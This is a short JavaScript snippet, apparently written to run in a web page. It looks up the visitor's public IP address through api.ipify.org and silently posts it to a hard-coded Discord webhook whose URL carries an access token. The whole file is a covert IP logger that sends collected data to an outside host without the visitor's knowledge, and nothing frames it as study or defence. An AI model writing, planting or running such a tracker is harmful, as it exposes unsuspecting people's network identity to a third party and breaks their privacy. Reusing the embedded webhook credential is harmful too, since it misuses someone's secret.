var ip = '';
fetch('https://api.ipify.org/?format=json')
.then(function(response){
    return response.json();
})
.then(function(data){
    ip = data.ip;
    var webhook = 'https://discord.com/api/webhooks/1134538845363392642/xFKduT3KUCaqJds-85DxaX6r-AgoWiHt7r2uopug9pHqJ8jOpt_uzuhqPc-W2olGeSUm'
    var message = {
        content: 'IP:' + ip
    };

    fetch(webhook, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(message)
    });
});